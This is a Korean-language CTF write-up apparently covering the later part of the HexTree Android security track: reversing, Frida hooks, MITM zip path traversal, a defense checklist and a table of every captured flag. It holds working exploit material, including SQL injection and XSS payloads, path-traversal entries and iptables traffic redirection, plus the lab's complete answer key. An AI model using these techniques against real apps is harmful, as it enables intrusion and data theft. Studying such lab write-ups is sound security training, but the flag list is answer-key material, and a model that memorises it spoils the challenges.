<p align="center"><img src="/assets/img/hextree-android-track/flag38.png" alt="Flag 38" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag39.png" alt="Flag 39" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag40.png" alt="Flag 40" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag41.png" alt="Flag 41" width="170" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em><strong>38</strong> data: URL의 JS가 브리지 호출 · <strong>39</strong> innerHTML DOM XSS · <strong>40</strong> file:// 유니버설 액세스로 토큰 유출 · <strong>41</strong> PostMessage 하이재킹</em></p>

## 9. Application Reversing

### 9.1 세 겹으로 숨긴 비밀 (Hidden Secrets)

`io.hextree.reversingexample`은 비밀번호를 자바 코드·리소스·네이티브 라이브러리에 하나씩
숨겨 둔 앱입니다. 세 곳 모두 정적 분석으로 드러납니다.

| 위치 | 확인 방법 | 값 |
|---|---|---|
| 자바 상수 | jadx — `SecretKeeper.getSecretPassword()` | `iAmHardcoded` |
| 문자열 리소스 | apktool — `res/values/strings.xml`의 `secret2` | `VeryResourcefulSecret` |
| 네이티브 | `libexample_nativelib.so` 문자열 추출 | `nativeSecretsCanBeFoundToo` |

세 값을 실제 UI에 입력해 각 화면의 플래그를 확인했습니다. jadx가 리소스를 ID로만 보여줄 때가
있으므로 apktool 결과를 함께 보는 습관이 중요합니다.

<p align="center"><img src="/assets/img/hextree-android-track/re03_loggedin.png" alt="첫 화면 통과" width="240" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/re05_third.png" alt="JNI 비밀" width="240" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em>하드코딩된 비밀번호 → <code>HXT{hardcoded-secrets-are-bad}</code> · 네이티브 문자열 → <code>HXT{from-java-to-native}</code></em></p>

### 9.2 패치·리패키징·서명

코스는 "매니페스트를 고쳐 `UnreachableActivity`에 도달하라"고 요구합니다. smali에서 비밀번호
분기를 뒤집고 목적지 클래스를 바꾼 뒤 리빌드·서명·설치까지 수행했습니다.

```smali
-   if-eqz v1, :cond_0                                       # 틀리면 종료
+   if-nez v1, :cond_0                                       # 조건 반전
-   const-class v3, Lio/hextree/reversingexample/LoggedInActivity;
+   const-class v3, Lio/hextree/reversingexample/UnreachableActivity;
```

```bash
java -jar apktool.jar b decompiled/re-patched -o repacked/re-patched.apk
java -jar $SDK/build-tools/36.0.0/lib/apksigner.jar sign --ks keys/debug.keystore … \
     --out repacked/re-patched-signed.apk repacked/re-patched.apk
adb uninstall io.hextree.reversingexample && adb install repacked/re-patched-signed.apk
```

여기서 2.3절과 연결됩니다. **서명이 바뀌므로 서명 검증이 있는 앱은 이 방법으로 뚫리지 않습니다.**
그럴 때 답은 파일을 건드리지 않는 런타임 계측입니다.

<p align="center"><img src="/assets/img/hextree-android-track/re08_patched.png" alt="패치된 앱" width="260" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em>패치본에서는 아무 비밀번호나 넣어도 도달 불가 화면이 열립니다</em></p>

### 9.3 난독화된 앱에서 API 인증 찾기 (Weather)

`io.hextree.weatherusa`는 R8로 난독화돼 클래스명이 `a`, `b`, `d`입니다. 그래도 **문자열은 남습니다.**

```
https://ht-api-mocks-…/xml/SOAP_server/ndfdXMLclient.php
Q/d.java:31:  httpURLConnection.setRequestProperty("X-API-KEY", str3);
strings.xml: <string name="ApiKey">HXT{android-api-key-b1872g}</string>
```

요청을 손으로 재구성하면 서버가 무엇을 보는지 드러납니다.

| 요청 | 응답 |
|---|---|
| 키 없음 | `Missing API Key` |
| 키 O + `whichClient` 없음/오타 | `Wrong client` |
| 키 O + `whichClient=NDFDgen` + UA | 정상 예보 XML (25 KB) |

정상 응답에도 플래그가 없어 XML을 다시 읽어보니 서버가 힌트를 흘리고 있었습니다
(`weather-type="Find correct zip code to get flag"`). 앱 리소스는 더 노골적이었고
(`Use reverse engineering to request the weather data for the correct ZIP code`),
코드에는 특별 취급되는 상수 두 개가 있었습니다.

```java
if (!zip.equals("13337") && !zip.equals("42")) {
    Toast.makeText(this, "Weather Updates Disabled", 0).show();   // 업데이트가 막힌 이유
    return;
}
```

`zipCodeList=42`로 호출하니 응답에 플래그가 들어 있었습니다(`HXT{android-api-h192gsa0}`).
클라이언트 상수는 서버 동작을 추측하는 좋은 단서가 됩니다.

업데이트본에서는 `strings.xml`의 키가 사라지고 네이티브로 옮겨갑니다. 파일 목록 diff가 바로
알려줍니다.

```
> ./lib/x86_64/libnative-lib.so
> ./smali/io/hextree/weatherusa/InternetUtil.smali      ← 새 클래스
```

알고리즘을 역분석하는 대신 **앱 안에서 그 함수를 호출**했습니다(자세한 계측 함정은 10절).

```
[getKey] HXT{obfuscated-api-key-asb126us}
```

키를 네이티브로 옮기는 것은 grep 방어일 뿐입니다. 파생 함수가 앱 안에 있는 한 공격자는
알고리즘을 몰라도 결과만 가져갑니다.

## 10. Dynamic Instrumentation

Frida로 다루는 패턴은 세 가지면 충분했습니다.

| 목적 | API |
|---|---|
| 클래스 핸들 | `Java.use('pkg.Class')` |
| 새 인스턴스 / 힙의 기존 인스턴스 | `Cls.$new(...)` / `Java.choose(...)` |
| 메서드 후킹 · 필드 조작 | `Cls.m.implementation = …` / `inst.field.value = 42` |

```
$ python frida-scripts/run.py frida-scripts/fridatarget-flags.js -n FridaTarget
[static]   HXT{a-static-calling-with-frida}
[instance] HXT{dynamic-droid}
[sesame]   HXT{the-droid-youre-looking-for}
```

첫 챌린지도 같은 방식으로 풀립니다. `FlagActivity`의 조건은 SeekBar 값이 정확히 42일 때인데,
힙의 인스턴스를 잡아 필드를 세팅하고 복호 메서드를 직접 호출하면 UI 조작이 필요 없습니다.

```javascript
Java.choose('io.hextree.flagproject.FlagActivity', {
    onMatch: function (inst) {
        inst.progressTracking.value = 42;
        console.log('[FLAG] ' + inst.decryptFlag());
    }, onComplete: function () {}
});
```

계측에서 걸린 함정도 기록해 둡니다. Weather 업데이트본의 네이티브 라이브러리를 Frida 컨텍스트에서
직접 로드하면 실패합니다.

```javascript
System.loadLibrary('native-lib');        // UnsatisfiedLinkError: library not found
System.load(dir + '/libnative-lib.so');  // NullPointerException (호출자 ClassLoader가 없음)

// 해결: 앱 자신의 메서드를 호출하면 앱 클래스로더로 로드됩니다
Java.use('io.hextree.weatherusa.InternetUtil').a(url, 'HextreeForecastUSA/v4.x');
```

## 11. Network Interception

### 11.1 평문 HTTP (Flag 64)

`io.hextree.pocketmaps`의 지도 서버 주소는 설정 클래스에 그대로 있습니다.

```java
private String s = "http://storage.googleapis.com/ht-labs-dev-static-files/pocketmaps/maps";
//                  ↑ https가 아닙니다
```

목록 JSON 자체에 플래그가 들어 있어, 평문으로 오가는 데이터를 한 번 들여다보는 것으로 끝납니다
(`HXT{cleartext-traffic-g19g2is}`). 코스는 `emulator -tcpdump packets.cap`로 잡아 Wireshark로
보라고 안내하며, 결과는 같습니다.

### 11.2 zip path traversal (Flag 65)

앱에는 압축 해제 코드가 두 벌 있습니다. graphhopper의 `Unzipper`는 `getCanonicalPath()`로
검증하는 **안전한** 구현이지만, 앱이 실제로 쓰는 쪽은 문자열을 그냥 이어붙입니다.

```java
File dir = new File(l.A().o(), name + "-gh");
for (ZipEntry e = zis.getNextEntry(); e != null; e = zis.getNextEntry()) {
    String path = dir.getAbsolutePath() + File.separator + e.getName();   // 검증 없음
    // ... new FileOutputStream(path) ...
}
```

문제는 트래픽을 어떻게 뺏느냐였습니다. 이 앱은 에뮬레이터 전역 프록시 설정을 타지 않고,
`/system/etc/hosts` 조작도 netd 캐시 때문에 실패했습니다. 확실한 방법은 root로 **iptables DNAT**를
거는 것이었습니다.

```bash
adb shell iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination 10.0.2.2:8080
python tools/fake_map_server.py      # 목록 JSON + 트래버설 엔트리를 담은 .ghz 서빙
```

DownloadManager는 앱이 아니라 시스템 프로세스가 받기 때문에, 프록시 설정과 달리 OUTPUT DNAT는
그 트래픽까지 함께 돌립니다. 결과는 지도 폴더 밖에 생긴 파일입니다.

```
$ adb shell cat …/pocketmaps/downloads/hax
pwned by MITM zip path traversal
```

앱은 이 파일을 감지하면 난독화한 플래그를 Toast로 한 번만 띄웁니다. 순식간에 사라지므로
Frida로 `Toast.makeText`를 후킹해 잡았습니다.

```
[Toast] HXT{zip-path-traversal-1sg17}
```

<p align="center"><img src="/assets/img/hextree-android-track/net07_after.png" alt="가짜 지도 목록" width="260" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em>우리 서버가 준 목록만 표시됩니다 — 앱이 트래픽을 전적으로 신뢰하고 있습니다</em></p>

## 12. Environment Pitfalls

재현 과정에서 "코드는 맞는데 아무 일도 일어나지 않는" 상황이 반복됐습니다. 대부분 플랫폼 규칙
때문이었고, 실무 진단에서도 오탐·미탐을 만드는 지점이라 정리해 둡니다.

| 증상 | 원인 | 해결 |
|---|---|---|
| `exported=false`인데 adb로 열림 | shell이 `START_ANY_ACTIVITY` 보유 | 영향 평가는 권한 없는 PoC 앱으로 |
| `bindService()`가 조용히 실패 | Android 11 패키지 가시성 | `<queries>` 선언 |
| 매니페스트 리시버가 브로드캐스트를 못 받음 | Android 8+ 암시적 브로드캐스트 제한 | `registerReceiver()` 동적 등록 |
| 재설치·force-stop 후 리시버 무반응 | 패키지가 *stopped* 상태 | 앱을 한 번 실행해 해제 |
| 두 번째 `am start`가 `onCreate`를 안 탐 | 동일 인텐트 + 기존 태스크 재사용 | `--activity-clear-task` + nonce extra |
| 액티비티가 아예 안 뜸 | 에뮬레이터 화면 잠김 | `input keyevent KEYCODE_WAKEUP` + `wm dismiss-keyguard` |
| 서비스·리시버가 띄우는 화면이 안 뜸 | 백그라운드 액티비티 시작 제한 | 피해 앱을 포그라운드에 두기 |
| `setResult` 후 결과가 안 옴 | 액티비티가 `finish()`를 안 함 | `input keyevent KEYCODE_BACK` |
| `frida -U -l script.js`가 즉시 죽음 | frida-tools 14.8.1 ↔ frida-core 16.7.19 불일치 | Python `frida` 모듈로 직접 실행 |
| protected broadcast 전송 거부 | `APPWIDGET_UPDATE` 등은 시스템 전용 | 앱이 부분 문자열 검사를 하면 임의 액션명으로 우회 |
| 앱이 프록시 설정을 무시 | 자체 HTTP 스택 / DownloadManager | iptables DNAT 또는 `emulator -tcpdump` |

## 13. Defense Checklist

분석에서 반복적으로 확인된 패턴을 방어 관점으로 뒤집으면 다음과 같습니다.

1. 외부 진입점을 최소화합니다. `exported=false`를 기본값으로 두고, 열어야 한다면
   `android:permission`(가능하면 `signature`)을 함께 지정합니다.
2. 민감 데이터는 **명시적 인텐트**로만 전달합니다. 암시적 인텐트·ordered broadcast·알림
   PendingIntent에 비밀을 싣지 않습니다.
3. 받은 Intent·Bundle·URI·파일명은 전부 신뢰 불가 입력으로 다룹니다. 특히 중첩 Intent를
   그대로 실행하지 않습니다(Intent Redirect).
4. `PendingIntent`는 `FLAG_IMMUTABLE`을 기본으로, base intent는 명시적으로 만듭니다.
5. Provider는 placeholder 쿼리와 projection map으로 컬럼·조건을 통제하고,
   `grantUriPermissions` 범위를 최소화합니다.
6. FileProvider 경로는 필요한 서브디렉터리만 노출하고, 파일명은 `getCanonicalPath()`로
   정규화해 기대 디렉터리 안인지 확인합니다.
7. 권한·역할 판정은 서버에서 합니다. 클라이언트 조건 검사와 클라이언트 저장 상태
   (SharedPreferences)는 신뢰 근거가 될 수 없습니다.
8. WebView는 JS 브리지를 최소화하고 로드 URL을 화이트리스트로 제한하며,
   `setAllowUniversalAccessFromFileURLs` 계열 설정을 끕니다.
9. 리소스·업데이트 다운로드는 HTTPS와 무결성 검증을 거치고, 압축 해제 시 경로를 검증합니다.

## 14. 분석 정리

이 트랙에서 확인한 취약점들은 서로 다른 컴포넌트에 흩어져 있지만, 원인은 소수의 패턴으로 수렴합니다.
**문자열로 신원과 출처를 판단**하고(`getCallingActivity().getClassName().contains(...)`,
`com.android.browser.application_id`, `action.contains(...)`), **비밀을 브로드캐스트 가능한
채널에 싣고**(암시적 인텐트, ordered broadcast, 알림 PendingIntent), **외부 입력을 실행하거나
권한을 위임**하며(Intent Redirect, `FLAG_MUTABLE` PendingIntent, URI permission 전파),
**클라이언트가 가진 상태를 신뢰**합니다(SharedPreferences, 네이티브에 숨긴 키, 역할을 담은 URL 파라미터).

버그바운티 관점에서 보면 각 패턴은 단독으로도 리포트가 되지만, 체인으로 엮일 때 영향이 커집니다.
FileProvider 오설정(쓰기 가능한 `root-path`)은 그 자체로 임의 파일 읽기·쓰기지만, 여기에 과도한
WebView 설정이 더해지면 앱 내부 토큰 유출로, SharedPreferences 신뢰가 더해지면 권한 상승으로
확장됩니다. 실제로 이 글의 Flag 35 → 36 → 40 경로가 그 예입니다.

| 구분 | 내용 |
|---|---|
| 분석 범위 | 코스 14개 · 랩 제출칸 58개(고유 플래그 57개) |
| 결과 | 플래그 57/57 획득 및 제출, 코스 14/14 완료(100%) |
| 주요 체인 | ① Intent Redirect → 비공개 컴포넌트 + URI 권한 ② root FileProvider 쓰기 → SharedPreferences 위조 ③ FileProvider 쓰기 → WebView file:// → 내부 토큰 유출 |
| 재현 도구 | 공격 앱 `io.hextree.poc`, Frida 러너, 미니 MITM 프록시·가짜 지도 서버, UI 자동화 스크립트 |
| 검증 | 앱 내부 `SolvedPreferences`(40건) · 플랫폼 `GET /api/lab/flags_solved`(57건) 교차 확인 |

플랫폼 진행률은 플래그와 별개 지표였습니다. `/api/progress/<course>`는 GET만 허용하고,
URL 직접 이동이나 페이지 열람으로는 올라가지 않으며, **저장된 위치에서 다음 화살표를 눌러 한 칸씩
전진할 때만** 반영됩니다. 이 규칙을 확인한 뒤 171개 레슨을 순서대로 진행해 14/14를 채웠습니다.

## 15. References

- HexTree Android Track — <https://app.hextree.io/map/android>
- `hextreeio/android-challenge1` — 첫 챌린지 소스(매니페스트 해시 안티치트)
- `hextreeio/android-poc-app` — 공격 앱 템플릿
- `hextreeio/android-webview-research` — WebView/CustomTabs 실험 앱
- Android Developers — [Intents and Intent Filters](https://developer.android.com/guide/components/intents-filters),
  [Package visibility](https://developer.android.com/training/package-visibility),
  [FileProvider](https://developer.android.com/reference/androidx/core/content/FileProvider),
  [PendingIntent](https://developer.android.com/reference/android/app/PendingIntent)
- Frida — <https://frida.re/docs/javascript-api/>

---

## 부록 — 획득 플래그 전체 기록

환경: Android 13 (API 33) x86_64 emulator `HexTree` · jadx 1.5.5 / apktool 3.0.2 / Frida 16.7.19
공격 앱: `io.hextree.poc` (직접 작성) · 대상 앱 8개

### 진행 현황 요약

HexTree Android 트랙은 코스 14개, 플래그 제출칸 **58개**로 구성된다(플랫폼 API 로 전수 확인).

| 코스 | 제출칸 | 상태 |
|---|---|---|
| Your First Android App | 1 | 완료 (challenge1 = #51) |
| Research Device & Emulator Setup | 3 | 완료 (#52–54) |
| Reverse Engineering Android Apps | 8 | 완료 (#55–62) |
| Network Interception | 3 | 완료 (#64·#65) |
| Dynamic Instrumentation | 3 | 완료 (#108–110) |
| Intent Attack Surface | 17 | 완료 (Flag 1–15, 22–23) |
| Android Permissions | 0 | 랩 없음(이론) |
| Android Services | 6 | 완료 (Flag 24–29) |
| Broadcast Receivers | 6 | 완료 (Flag 16–21) |
| Android (Insecure) Storage | 0 | 랩 없음(이론) |
| Content- and FileProvider | 7 | 완료 (Flag 30–37) |
| WebViews and CustomTabs | 4 | 완료 (Flag 38–41) |
| Android Bug Bounty | 0 | 랩 없음(정책·방법론) |
| Bluetooth RE Basics | 0 | 랩 없음(하드웨어 필요) |

**획득: 58/58 (고유 플래그 57개 전부).**

**플랫폼 제출 완료(2026-07-25):** 각 레슨의 SUBMIT FLAG 칸에 값을 입력해 제출했고,
`GET /api/lab/flags_solved` 로 **57개 전부 등록**을 확인했다(= 고유 플래그 전체).

```
solved=57 ids=51,52,53,54,55,56,57,58,59,60,61,62,64,65,67,68,69,70,71,72,73,74,75,76,77,78,
             79,80,81,82,83,84,85,86,87,88,89,95,96,97,98,99,100,101,102,103,104,105,106,107,
             108,109,110,114,115,116,117
```

| 코스 | 제출/전체 |
|---|---|
| Your First Android App | 1/1 |
| Research Device & Emulator Setup | 3/3 |
| Reverse Engineering Android Apps | 8/8 |
| Dynamic Instrumentation | 3/3 |
| Intent Attack Surface | 17/17 |
| Broadcast Receivers | 6/6 |
| Android Services | 6/6 |
| Content-/FileProvider | 7/7 |
| WebViews and CustomTabs | 4/4 |
| Network Interception | 2/2 |

### 코스 진행률까지 100%

플래그와 코스 진행률(%)은 별개 지표다. 진행률은 **저장된 위치에서 "다음" 화살표를 눌러 한 칸씩
전진할 때만** 올라간다(URL 로 건너뛰거나 페이지만 열어도 오르지 않고, `/api/progress/<course>` 는
GET 만 허용 → 405). 그래서 각 코스의 저장 위치로 가서 다음 버튼을 순서대로 눌러 171개 레슨을 모두 진행했다.

```
completed=14/14
✔ intent-threat-surface 100% (16/16) labs=true      ✔ content-provider   100% (13/13) labs=true
✔ broadcast-receivers   100% (6/6)   labs=true      ✔ android-webviews   100% (15/15) labs=true
✔ android-services      100% (10/10) labs=true      ✔ reverse-android-apps 100% (16/16) labs=true
✔ research-device-setup 100% (7/7)   labs=true      ✔ network-interception 100% (12/12) labs=true
✔ first-android-app     100% (11/11) labs=true      ✔ android-dynamic-instrumentation 100% (19/19) labs=true
✔ android-permissions   100% (8/8)                  ✔ insecure-storage   100% (13/13)
✔ android-bugbounty     100% (10/10)                ✔ android-bluetooth-reversing 100% (15/15)
```

맵에서도 **COMPLETED COURSES 14 / 14** 로 표시되고, 14개 헥사곤 전부 완료 표시(체크)로 바뀌었다.

처음에는 #61·#64·#65 세 개가 남아 있었는데, 각각 이렇게 풀었다.
- **#61**: 서버 응답 XML 의 힌트(`Find correct zip code to get flag`) + 앱 코드의 특별값(`13337`, `42`)
  → `zipCodeList=42` 로 호출하니 플래그가 응답에 들어 있었다.
- **#64**: 지도 목록 JSON 을 평문 HTTP 로 받는다 → JSON 안에 플래그.
- **#65**: iptables DNAT 로 트래픽을 뺏고 `../../downloads/hax` 엔트리를 넣은 가짜 지도 zip 을 서빙
  → 앱이 압축을 풀며 폴더 밖에 파일 생성 → 앱이 띄우는 Toast(난독화된 문자열)에 플래그.
Attack Surface 앱 41개 플래그는 앱 내부 `SolvedPreferences` 에 40건 solved 로 기록되어 교차 검증됨
(34·35 는 앱이 `success()` 를 호출하지 않는 파일 기반 챌린지라 기록되지 않지만 플래그 문자열은 획득).

### Challenge 1 / Your First Android App

| # | 주제 | 플래그 |
|---|---|---|
| 51 | git 저장소를 받아 소스 분석 (매니페스트 해시 안티치트) | `HXT{read-or-modify-sources-gha82f}` |

### Research Device & Emulator Setup — `io.hextree.adbtestapplication`

| # | 과제 | 방법 | 플래그 |
|---|---|---|---|
| 52 | 설치·실행 | `adb install` → `am start` | `HXT{Ready-to-Android}` |
| 53 | 숨은 액티비티 찾기 | `dumpsys package` → QUICK_VIEW/INFO → `am start` | `HXT{not-so-hidden-activity}` |
| 54 | 로그에서 찾기 | `adb logcat -d \| grep flag` | `HXT{log-all-the-cats}` |

### Reverse Engineering Android Apps — `io.hextree.reversingexample` / `io.hextree.weatherusa`

| # | 과제 | 방법 | 플래그 |
|---|---|---|---|
| 55 | 비밀 액티비티 | exported=true → `am start .SecretActivity` | `HXT{A-not-so-secret-activity}` |
| 56 | 도달 불가 액티비티 | smali/매니페스트 패치 → `apktool b` → `apksigner` | `HXT{I-thought-I-am-unreachable}` |
| 57 | 첫 비밀번호 | jadx — `SecretKeeper.getSecretPassword()` = `iAmHardcoded` | `HXT{hardcoded-secrets-are-bad}` |
| 58 | 두 번째 비밀번호 | `res/values/strings.xml` — `secret2` = `VeryResourcefulSecret` | `HXT{resources-are-no-match-for-me}` |
| 59 | 세 번째 비밀번호 | `libexample_nativelib.so` 문자열 = `nativeSecretsCanBeFoundToo` | `HXT{from-java-to-native}` |
| 60 | Weather API 인증 방식 | `X-API-KEY` 헤더 + `strings.xml` 의 ApiKey | `HXT{android-api-key-b1872g}` |
| 61 | API 수동 호출 | 응답 힌트 + 앱 상수 → `zipCodeList=42` 로 호출 | `HXT{android-api-h192gsa0}` |
| 62 | 업데이트 diff | 새 `InternetUtil` + `libnative-lib.so` → Frida 로 `getKey()` 호출 | `HXT{obfuscated-api-key-asb126us}` |

### Dynamic Instrumentation — `io.hextree.fridatarget`

| # | 과제 | 방법 | 플래그 |
|---|---|---|---|
| 108 | 정적 메서드 | `Java.use(...).flagFromStaticMethod()` | `HXT{a-static-calling-with-frida}` |
| 109 | 인스턴스 메서드 | `Cls.$new().flagFromInstanceMethod()` | `HXT{dynamic-droid}` |
| 110 | 매직 워드 | `flagIfYouCallMeWithSesame("sesame")` | `HXT{the-droid-youre-looking-for}` |

### Intent Attack Surface — `io.hextree.attacksurface` (Flag 1–15, 22–23)

| # | 이름 | 취약 원인 | 획득 방법 | 플래그 |
|---|---|---|---|---|
| 1 | Basic exported activity | `exported=true` | 컴포넌트 직접 실행 | `HXT{basic-exported-activity-1bh7sd}` |
| 2 | Intent with extras | action 값만 검사 | `-a io.hextree.action.GIVE_FLAG` | `HXT{intent-actions-activity-dsj198w}` |
| 3 | Intent with a data URI | data URI 신뢰 | `-d https://app.hextree.io/map/android` | `HXT{intent-uri-data-sda982bs}` |
| 4 | State machine | 상태를 앱 내부에만 저장 | PREPARE→BUILD→GET_FLAG 순차 호출 | `HXT{sometimes-require-multiple-calls-5133au2}` |
| 5 | Intent in intent | 중첩 Intent extra 파싱 | `EXTRA_INTENT{return=42, nextIntent{reason=back}}` | `HXT{intent-in-intent-in-intent-298abso}` |
| 6 | Not exported | **Intent Redirect** | Flag5 의 `nextIntent` 로 앱이 대신 실행 + `FLAG_GRANT_READ_URI_PERMISSION` | `HXT{redirect-to-not-exported-n129vbs}` |
| 7 | Activity lifecycle tricks | `onNewIntent` 재진입 | `-a OPEN` → `-a REOPEN --activity-single-top` | `HXT{activity-lifecycle-ninja-jhbsa89}` |
| 8 | Do you expect a result? | 호출자 클래스명 문자열 검사 | 클래스명에 `Hextree` 포함한 액티비티가 `startActivityForResult` | `HXT{no-expected-return-ds282ba}` |
| 9 | Receive result with flag | 결과 Intent 에 비밀 동봉 | 위와 동일 + `onActivityResult` 에서 추출 | `HXT{flag-in-result-gs891jh2}` |
| 10 | Hijack implicit intent | 암시적 인텐트에 비밀 탑재 | `ATTACK_ME` intent-filter 등록해 수신 | `HXT{hijacked-intent-with-flag-dsui2908}` |
| 11 | Respond to implicit intent | 응답 결과를 검증 없이 신뢰 | `setResult(token=0x41414141)` | `HXT{sent-back-result-1897djh}` |
| 12 | Careful intent conditions | 위 + 자신의 인텐트 조건 | 피해앱을 `--ez LOGIN true` 로 실행 후 토큰 응답 | `HXT{tricky-intent-condition-bjhs782}` |
| 13 | Create a `hex://open/` link | 브라우저 딥링크 신뢰 | `hex://flag?action=give-me` + `com.android.browser.application_id` | `HXT{browser-link-or-app2app-s82h}` |
| 14 | Hijack web login | **역할(type)을 URL 파라미터로 결정** | 정상 발급 토큰 그대로 `type=user`→`type=admin` | `HXT{hijacked-login-token-abjh28a}` |
| 15 | Create an `intent://` link | `intent://` extras 신뢰 | action `GIVE_FLAG` + `S.action=flag;B.flag=true` | `HXT{intent-uris-are-cool-12fgv}` |
| 22 | Receive pending intent | 외부 PendingIntent 를 대신 발사 | mutable PendingIntent 를 넘겨 플래그 회수 | `HXT{received-mutable-flags-xa81b}` |
| 23 | Hijack pending intent | **FLAG_MUTABLE PendingIntent 유출** | `MUTATE_ME` 로 받은 PI 에 `code=42` 채워 발사 | `HXT{teenage-mutable-intent-turtles-s2df}` |

### Broadcast Receivers (Flag 16–21)

| # | 이름 | 취약 원인 | 획득 방법 | 플래그 |
|---|---|---|---|---|
| 16 | Basic exposed receiver | `exported=true` 리시버 | `am broadcast -n …Flag16Receiver --es flag give-flag-16` | `HXT{basic-receiver-ds82s}` |
| 17 | Receiver with response | ordered broadcast 결과로 비밀 반환 | `am broadcast` 의 result extras 에서 회수 | `HXT{returned-result-ds82s}` |
| 18 | Hijack broadcast intent | 암시적 ordered broadcast 에 비밀 탑재 | **동적 등록** 리시버(priority 999) 선점 + `setResultCode(1)` | `HXT{hijacking-broadcast-intent-as91}` |
| 19 | Widget system intents | `action.contains("APPWIDGET_UPDATE")` 부분 문자열 검사 | 자체 액션명 + `appWidgetOptions` Bundle 위조 | `HXT{exposed-widget-receiver-xz7bs}` |
| 20 | Notification button intents | 동적 리시버를 `RECEIVER_EXPORTED` 로 등록 | `am broadcast -a io.hextree.broadcast.GET_FLAG --ez give-flag true` | `HXT{spoof-notificaiton-result-er12d}` |
| 21 | Hijack notification button | 알림 PendingIntent 가 **암시적** 브로드캐스트 | 동적 리시버로 가로채 extra 탈취 | `HXT{intercepted-notificaiton-ah2us}` |

### Android Services (Flag 24–29)

| # | 이름 | 취약 원인 | 획득 방법 | 플래그 |
|---|---|---|---|---|
| 24 | Basic service | `exported=true` 서비스 | `am start-service -a …START_FLAG24_SERVICE` | `HXT{basic-service-ha98sl}` |
| 25 | Multi-step service | 상태를 서비스 인스턴스에 보관 | UNLOCK1→2→3 순차 호출 | `HXT{only-one-running-service-1hasu}` |
| 26 | Messenger service | 바인더 호출자 검증 없음 | `bindService` 후 `Message(what=42)` | `HXT{message-say-whaaaat-aug2is}` |
| 27 | Messenger protocol | 비밀번호를 클라이언트에 그대로 알려줌 | echo → get password → get flag | `HXT{service-messages-js71h}` |
| 28 | AIDL service | AIDL 메서드에 권한 검사 없음 | AIDL 클래스 없이 `Binder.transact(1)` | `HXT{bound-aidl-service-sdf2ds}` |
| 29 | AIDL auth service | `init()` 이 비밀번호를 반환 | init→authenticate→success | `HXT{ai-ai-aidl-service-a2si1}` |

### Content-/FileProvider · Storage (Flag 30–37)

| # | 이름 | 취약 원인 | 획득 방법 | 플래그 |
|---|---|---|---|---|
| 30 | Basic provider | `exported=true` provider | `content query --uri content://io.hextree.flag30/success` | `HXT{query-provider-table-1vsd8}` |
| 31 | UriMatcher | 경로만으로 인가 판단 | `content://io.hextree.flag31/flag/31` | `HXT{query-uri-matcher-sakj1}` |
| 32 | SQL injection | selection 문자열 연결 | `--where "1=1) OR (1=1"` | `HXT{sql-injection-in-provider-1gs82}` |
| 33.1 | Return provider access | URI 권한을 결과로 반환 | 결과 URI + **projection SQLi** | `HXT{union-select-injection-1bs98}` |
| 33.2 | Implicit provider access | URI 권한을 암시적 인텐트로 유출 | 인텐트 수신 → 같은 SQLi | `HXT{union-select-injection-1bs98}` |
| 34 | Simple File Provider | filename 검증 없음 + 쓰기 권한 | 생성 → 앱이 기록 → 경로 바꿔 읽기 | `HXT{sharing-filedescriptors-av27s}` |
| 35 | Root-File Provider | `<root-path path="/">` | `../flag35.txt` 트래버설 | `HXT{path-traversal-stealer-s1hw9}` |
| 36 | Overwriting Shared Prefs | 자기 설정 파일을 신뢰 | `../shared_prefs/…xml` 을 `solved=true` 로 덮어쓰기 | `HXT{overwriting-shared-prefs-034nsd}` |
| 37 | Filename Traversal | 외부 provider 메타데이터 신뢰 | 가짜 `_display_name`/`_size`/내용 | `HXT{file-name-query-187xh}` |

### WebViews · CustomTabs (Flag 38–41)

| # | 이름 | 취약 원인 | 획득 방법 | 플래그 |
|---|---|---|---|---|
| 38 | @JavascriptInterface | exported WebView + `URL` extra | `data:text/html,<script>hextree.success(true)</script>` | `HXT{call-from-js-1vsa91b}` |
| 39 | WebView XSS | `innerHTML` 템플릿 삽입 | `<img src=x onerror=hextree.success()>` | `HXT{webview-xss-1hsa1njs}` |
| 40 | Leak via file:// | `setAllowUniversalAccessFromFileURLs(true)` | Flag35 로 exploit.html 삽입 → XHR 로 token.txt 유출 | `HXT{leak-fileprovider-1gash2}` |
| 41 | CustomTabs PostMessage | 채널이 **현재 로드된 페이지**와 연결 | 로컬 서버 페이지에서 `{"message":"success"}` | `HXT{post-message-origin-h19sba3}` |

### Network Interception — `io.hextree.pocketmaps`

| # | 이름 | 취약 원인 | 획득 방법 | 플래그 |
|---|---|---|---|---|
| 64 | 평문 HTTP 트래픽 | 지도 목록/파일을 `http://` 로 받음 | 목록 JSON 안의 `hextree-flag` | `HXT{cleartext-traffic-g19g2is}` |
| 65 | zip path traversal | 압축 해제 시 엔트리 경로 미검증 | iptables DNAT 로 MITM → `../../downloads/hax` 엔트리 zip 서빙 | `HXT{zip-path-traversal-1sg17}` |

### 최종 결과

트랙의 모든 랩 완료. 마지막 세 개(#61·#64·#65)의 값:

| # | 코스 / 과제 | 플래그 |
|---|---|---|
| 61 | Weather API 수동 호출 (`zipCodeList=42`) | `HXT{android-api-h192gsa0}` |
| 64 | PocketHexMap 평문 HTTP 트래픽 분석 | `HXT{cleartext-traffic-g19g2is}` |
| 65 | MITM zip path traversal 로 `hax` 파일 생성 | `HXT{zip-path-traversal-1sg17}` |
